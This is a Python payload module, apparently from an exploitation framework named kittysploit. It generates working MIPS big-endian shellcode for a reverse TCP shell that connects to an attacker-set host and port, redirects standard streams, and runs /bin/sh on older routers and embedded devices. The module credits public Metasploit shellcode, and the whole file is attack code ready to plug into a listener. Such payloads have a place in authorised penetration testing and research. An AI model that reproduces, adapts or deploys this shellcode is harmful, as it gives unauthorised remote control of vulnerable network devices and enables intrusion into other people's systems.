#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Linux/MIPS BE reverse TCP + dup2 + execve("//bin/sh") — based on public
# shellcode by rigan (Metasploit linux/mipsbe/shell_reverse_tcp, EDB-18226).
# Use with listeners/multi/reverse_tcp.

from kittysploit import *


class Module(Payload):
    __info__ = {
        "name": "MIPS BE reverse TCP shell (raw)",
        "description": (
            "MIPS big-endian 32-bit connect-back stager: socket, connect, "
            "dup2 x3, execve //bin/sh. Typical on older big-endian routers. "
            "Output is raw bytes (not a command string)."
        ),
        "category": PayloadCategory.CMD,
        "arch": Arch.MIPS,
        "platform": Platform.LINUX,
        "listener": "listeners/multi/reverse_tcp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
        "tags": ["mips", "mipsbe", "iot", "embedded"],
    }

    lhost = OptString("127.0.0.1", "Connect-back IPv4 (no IPv6)", True)
    lport = OptPort(4444, "Connect-back port", True)
    encoder = OptString("", "Encoder module path (optional)", False, True)

    @classmethod
    def build_mipsbe_reverse_shell(cls, lhost: str, lport: int) -> bytes:
        parts = str(lhost).strip().split(".")
        if len(parts) != 4:
            raise ValueError("lhost must be IPv4")
        host = [int(p) for p in parts]
        if any(v < 0 or v > 255 for v in host):
            raise ValueError("invalid IPv4 octet")
        port = int(lport)
        if port < 1 or port > 65535:
            raise ValueError("lport must be between 1 and 65535")
        port_hi = (port >> 8) & 0xFF
        port_lo = port & 0xFF
        port_b = bytes([port_hi, port_lo])

        out = bytearray()
        out.extend(
            b"\x24\x0f\xff\xfa"
            b"\x01\xe0\x78\x27"
            b"\x21\xe4\xff\xfd"
            b"\x21\xe5\xff\xfd"
            b"\x28\x06\xff\xff"
            b"\x24\x02\x10\x57"
            b"\x01\x01\x01\x0c"
            b"\xaf\xa2\xff\xff"
            b"\x8f\xa4\xff\xff"
            b"\x34\x0f\xff\xfd"
            b"\x01\xe0\x78\x27"
            b"\xaf\xaf\xff\xe0"
        )
        out.extend(b"\x3c\x0e" + port_b)
        out.extend(b"\x35\xce" + port_b)
        out.extend(b"\xaf\xae\xff\xe4")
        out.extend(b"\x3c\x0e" + bytes([host[0], host[1]]))
        out.extend(b"\x35\xce" + bytes([host[2], host[3]]))
        out.extend(
            b"\xaf\xae\xff\xe6"
            b"\x27\xa5\xff\xe2"
            b"\x24\x0c\xff\xef"
            b"\x01\x80\x30\x27"
            b"\x24\x02\x10\x4a"
            b"\x01\x01\x01\x0c"
            b"\x24\x11\xff\xfd"
            b"\x02\x20\x88\x27"
            b"\x8f\xa4\xff\xff"
            b"\x02\x20\x28\x21"
            b"\x24\x02\x0f\xdf"
            b"\x01\x01\x01\x0c"
            b"\x24\x10\xff\xff"
            b"\x22\x31\xff\xff"
            b"\x16\x30\xff\xfa"
            b"\x28\x06\xff\xff"
            b"\x3c\x0f\x2f\x2f"
            b"\x35\xef\x62\x69"
            b"\xaf\xaf\xff\xec"
            b"\x3c\x0e\x6e\x2f"
            b"\x35\xce\x73\x68"
            b"\xaf\xae\xff\xf0"
            b"\xaf\xa0\xff\xf4"
            b"\x27\xa4\xff\xec"
            b"\xaf\xa4\xff\xf8"
            b"\xaf\xa0\xff\xfc"
            b"\x27\xa5\xff\xf8"
            b"\x24\x02\x0f\xab"
            b"\x01\x01\x01\x0c"
        )
        return bytes(out)

    def generate(self):
        return self.build_mipsbe_reverse_shell(str(self.lhost), int(self.lport))
